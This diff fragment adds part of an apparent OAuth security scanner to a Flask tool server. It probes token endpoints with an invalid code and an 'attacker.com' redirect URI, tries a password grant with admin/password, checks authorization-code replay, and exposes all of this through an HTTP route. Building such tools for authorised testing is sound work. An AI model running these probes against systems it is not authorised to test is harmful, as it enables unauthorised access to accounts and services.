+            "code":       "invalid_code_test",
+            "redirect_uri":"https://attacker.com",
+            "client_id":  client_id,
+        })
+        if r:
+            body_lower = (r.text or "").lower()
+            if r.status_code == 200:
+                issues.append({"severity": "CRITICAL", "issue": "Token endpoint returned 200 for invalid code without client auth"})
+            elif "invalid_client" not in body_lower and "client_authentication" not in body_lower and r.status_code != 401:
+                issues.append({"severity": "MEDIUM", "issue": f"Token endpoint returned {r.status_code} without client_secret — may lack client authentication"})
+
+        # Client credentials grant without secret
+        r2 = self._post(token_endpoint, {
+            "grant_type": "client_credentials",
+            "client_id":  client_id,
+        })
+        if r2 and r2.status_code == 200:
+            issues.append({"severity": "CRITICAL", "issue": "client_credentials grant works without client_secret"})
+
+        # Password grant
+        r3 = self._post(token_endpoint, {
+            "grant_type": "password",
+            "client_id":  client_id,
+            "username":   "admin",
+            "password":   "password",
+            "scope":      "openid",
+        })
+        if r3:
+            if r3.status_code == 200:
+                issues.append({"severity": "CRITICAL", "issue": "ROPC grant (password) works with admin/password"})
+            elif "unsupported_grant_type" not in (r3.text or "").lower():
+                issues.append({"severity": "MEDIUM", "issue": "ROPC (password) grant accepted — credential brute-force possible"})
+
+        return {
+            "token_endpoint": token_endpoint,
+            "issues":         issues,
+            "severity_max":   "CRITICAL" if any(i["severity"] == "CRITICAL" for i in issues) else
+                              "HIGH"     if any(i["severity"] == "HIGH"     for i in issues) else
+                              "MEDIUM"   if issues else "INFO",
+        }
+
+    # ------------------------------------------------------------------ 8. authorization code reuse
+    def code_reuse_check(self, token_endpoint: str, code: str, redirect_uri: str, client_id: str) -> Dict:
+        """Check if an authorization code can be used more than once."""
+        if not (token_endpoint and code):
+            return {"error": "token_endpoint and code required"}
+
+        data = {
+            "grant_type":   "authorization_code",
+            "code":         code,
+            "redirect_uri": redirect_uri,
+            "client_id":    client_id,
+        }
+        r1 = self._post(token_endpoint, data)
+        r2 = self._post(token_endpoint, data)
+        reused = r2 and r2.status_code == 200 and "access_token" in (r2.text or "")
+        return {
+            "first_use_status":  r1.status_code if r1 else None,
+            "second_use_status": r2.status_code if r2 else None,
+            "reusable":          reused,
+            "severity":          "HIGH" if reused else "INFO",
+            "issue":             "Authorization code accepted twice — code replay attack possible" if reused else "Code correctly invalidated after first use",
+        }
+
+    # ------------------------------------------------------------------ orchestrator
+    def run(
+        self,
+        target:                 str,
+        authorization_endpoint: str = "",
+        token_endpoint:         str = "",
+        client_id:              str = "",
+        client_secret:          str = "",
+        redirect_uri:           str = "",
+        authorization_code:     str = "",
+        run_discovery:          bool = True,
+        run_redirect_bypass:    bool = True,
+        run_state_csrf:         bool = True,
+        run_pkce:               bool = True,
+        run_implicit:           bool = True,
+        run_scope_creep:        bool = True,
+        run_token_checks:       bool = True,
+        run_code_reuse:         bool = False,
+    ) -> Dict:
+        start   = time.time()
+        results = {}
+
+        if not target.startswith("http"):
+            target = "https://" + target
+
+        # Auto-discover endpoints if not provided
+        if run_discovery:
+            disc = self.discover(target)
+            results["discovery"] = disc
+            # Extract from first found config
+            if disc["discovery_docs"] and not authorization_endpoint:
+                cfg = disc["discovery_docs"][0].get("config", {})
+                authorization_endpoint = authorization_endpoint or cfg.get("authorization_endpoint", "")
+                token_endpoint         = token_endpoint         or cfg.get("token_endpoint", "")
+
+        if run_redirect_bypass and authorization_endpoint and client_id and redirect_uri:
+            results["redirect_bypass"] = self.redirect_uri_bypass(
+                authorization_endpoint, client_id, redirect_uri
+            )
+
+        if run_state_csrf and authorization_endpoint:
+            results["state_csrf"] = self.state_csrf_check(
+                authorization_endpoint, client_id, redirect_uri
+            )
+
+        if run_pkce and authorization_endpoint:
+            results["pkce_downgrade"] = self.pkce_downgrade(
+                authorization_endpoint, client_id, redirect_uri
+            )
+
+        if run_implicit and authorization_endpoint:
+            results["implicit_flow"] = self.implicit_flow_check(
+                authorization_endpoint, client_id, redirect_uri
+            )
+
+        if run_scope_creep and authorization_endpoint:
+            results["scope_creep"] = self.scope_creep_check(
+                authorization_endpoint, client_id, redirect_uri
+            )
+
+        if run_token_checks and token_endpoint:
+            results["token_endpoint"] = self.token_endpoint_checks(
+                token_endpoint, client_id, client_secret
+            )
+
+        if run_code_reuse and token_endpoint and authorization_code:
+            results["code_reuse"] = self.code_reuse_check(
+                token_endpoint, authorization_code, redirect_uri, client_id
+            )
+
+        # Aggregate severity counts
+        all_issues = []
+        for key, val in results.items():
+            if isinstance(val, dict):
+                all_issues.extend(val.get("issues", []))
+                if val.get("severity") in ("CRITICAL", "HIGH", "MEDIUM"):
+                    all_issues.append({"severity": val["severity"], "source": key})
+            elif isinstance(val, list):
+                for item in val:
+                    if isinstance(item, dict) and "severity" in item:
+                        all_issues.append(item)
+
+        sev_count = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0}
+        for i in all_issues:
+            sev_count[i.get("severity", "INFO")] = sev_count.get(i.get("severity", "INFO"), 0) + 1
+
+        results["summary"] = {
+            "target":       target,
+            "critical":     sev_count["CRITICAL"],
+            "high":         sev_count["HIGH"],
+            "medium":       sev_count["MEDIUM"],
+            "total_issues": len(all_issues),
+            "duration_sec": round(time.time() - start, 2),
+        }
+        return results
+
+
+oauth_tester = OAuthTester()
+
+
+@app.route("/api/tools/oauth/test", methods=["POST"])
+def oauth_test_route():
+    try:
+        params = request.json or {}
+        result = oauth_tester.run(
+            target=params.get("target", ""),
+            authorization_endpoint=params.get("authorization_endpoint", ""),
+            token_endpoint=params.get("token_endpoint", ""),
+            client_id=params.get("client_id", ""),
+            client_secret=params.get("client_secret", ""),
+            redirect_uri=params.get("redirect_uri", ""),
+            authorization_code=params.get("authorization_code", ""),
+            run_discovery=bool(params.get("run_discovery", True)),
+            run_redirect_bypass=bool(params.get("run_redirect_bypass", True)),
+            run_state_csrf=bool(params.get("run_state_csrf", True)),
+            run_pkce=bool(params.get("run_pkce", True)),
+            run_implicit=bool(params.get("run_implicit", True)),
+            run_scope_creep=bool(params.get("run_scope_creep", True)),
+            run_token_checks=bool(params.get("run_token_checks", True)),
+            run_code_reuse=bool(params.get("run_code_reuse", False)),
+        )
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 oauth/test error: {e}")
         return jsonify({"error": f"Server error: {e}"}), 500
 
 
